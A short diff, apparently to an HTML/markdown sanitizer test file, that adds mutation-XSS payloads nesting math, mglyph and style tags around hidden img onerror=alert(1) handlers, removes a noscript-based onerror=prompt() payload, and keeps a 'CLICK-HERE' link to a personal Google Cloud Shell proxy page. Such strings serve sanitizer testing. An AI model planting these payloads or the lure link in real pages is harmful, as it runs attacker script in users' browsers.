@@ -1,7 +1,13 @@
 <p title="<h1>test</p>">fff</h1>
+----
+<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=alert(1)&gt;">
 
-<noscript><p title="</noscript><img src=x onerror=prompt()>">
 
+<math><mtext><table><mglyph><style><![CDATA[</style><img title="]]&gt;&lt;/mglyph&gt;&lt;img&Tab;src=1&Tab;onerror=alert(1)&gt;">
+
+<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;/mglyph&gt;&lt;img&Tab;src=1&Tab;onerror=alert(1)&gt;">
+
+----
 > hello <a name="n"
 > href="https://shell.cloud.google.com/devshell/proxy?authuser=0&port=970&cloudshell_retry=true&devshellProxyPath=/mini-browser/home/donreddy1992/run.html">*CLICK-HERE*</a>\
 
